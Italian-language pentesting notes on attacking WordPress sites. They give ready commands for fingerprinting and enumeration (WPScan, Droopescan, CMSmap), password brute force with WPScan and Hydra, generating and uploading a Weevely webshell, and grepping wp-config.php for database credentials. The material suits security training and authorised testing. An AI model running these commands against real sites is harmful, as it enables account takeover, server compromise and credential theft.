# 📰 WordPress Exploitation & Enumeration

Appunti e snippet per la fase di **ricognizione e attacco su WordPress**.

## 📌 Obiettivi

* Identificare se il target usa **WordPress**
* Enumerare versioni, plugin, temi e utenti
* Cercare vulnerabilità note sfruttabili
* Preparare brute force / exploit mirati

---

## 🔎 Riconoscere WordPress

**Perché farlo:**
Prima di lanciare WPScan conviene verificare che il target sia effettivamente WordPress.

### 🔹 Comandi rapidi

```bash
# Fingerprint con WhatWeb
whatweb http://<target-ip>/

# Cerca indizi di WordPress (wp-content, wp-admin)
curl -s -I http://<target-ip>/ | grep "wp-"
```

---

## 🛠️ WPScan (Main Tool)

**Perché usarlo:**
Strumento principale per l’enumerazione WordPress: versione, utenti, plugin, temi, vuln DB integrato.

**Opzioni principali:**

* `--url` → target
* `--enumerate` → enumera info (u = users, p = plugins, t = themes, vp = vuln plugins, vt = vuln themes)
* `--api-token` → usa database ufficiale di vulnerabilità (serve token gratuito)
* `-P` → brute force con wordlist
* `-U` → specifica username o lista di utenti
* `--password-attack wp-login` → forza l’attacco sulla pagina di login WP

### 🔹 Comandi diretti

```bash
# Enum utenti
wpscan --url http://<target-ip> --enumerate u

# Enum full scan (plugin, temi, utenti)
wpscan --url http://<target-ip> -e vp,vt,u 

# Enum plugin + vulnerabilità note
wpscan --url http://<target-ip> --enumerate p --api-token <TOKEN>
```

---

## 🔑 WPScan – Password Bruteforce

**Perché farlo:**
Dopo aver enumerato gli utenti, puoi provare password comuni con WPScan.

### 🔹 Attacco base (un solo utente)

```bash
wpscan --url http://<target-ip> -U admin -P /usr/share/wordlists/rockyou.txt
```

### 🔹 Attacco multiplo (lista di utenti)

```bash
wpscan --url http://<target-ip> -U users.txt -P /usr/share/wordlists/rockyou.txt
```

### 🔹 Specifica la modalità di attacco

```bash
wpscan --url http://<target-ip> -U admin -P rockyou.txt --password-attack wp-login
```

### 🔹 Aggressività / Performance

```bash
# Limita o aumenta i thread
wpscan --url http://<target-ip> -U admin -P rockyou.txt --max-threads 10
```

### 💾 Salvataggio su file

```bash
wpscan --url http://<target-ip> -U users.txt -P rockyou.txt -o brute_results.txt
```

---

## 📦 Droopescan (Alternative CMS Scanner)

**Perché usarlo:**
Può rilevare plugin, temi e versioni di CMS (Drupal, SilverStripe, Joomla, WordPress).

### 🔹 Comando base

```bash
droopescan scan wordpress -u http://<target-ip>/
```

---

## 🗂️ CMSmap (Cross-CMS Enumeration)

**Perché usarlo:**
Supporta più CMS, incluso WordPress. Buono per test veloci.

### 🔹 Comando base

```bash
cmsmap http://<target-ip> -f W
```

---

## 🔑 Login Bruteforce (Hydra Alternative)

**Perché usarlo:**
Se WPScan non basta o vuoi parallelizzare.

### 🔹 Comando con Hydra

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
```

---

## 🐚 Upload Shell / Exploit

**Perché usarlo:**
Se puoi caricare file (es. plugin, media upload), testare upload di una **webshell**.

### 🔹 Quick example

```bash
# Usa Weevely per generare una webshell PHP
weevely generate pass123 shell.php

# Caricala in /wp-content/uploads/
```

---

## ⚡ Workflow tipico su WP

1. **Identifica** → WhatWeb / manual check `/wp-content/`
2. **Enumera** → WPScan (utenti, plugin, temi, vuln)
3. **Cerca credenziali** → brute con WPScan/Hydra
4. **Exploita** → plugin vulnerabili o shell upload
5. **Post-Explo** → wp-config.php (credenziali DB)

```bash
# Se ottieni accesso al server → dump credenziali MySQL
cat wp-config.php | grep DB_
```

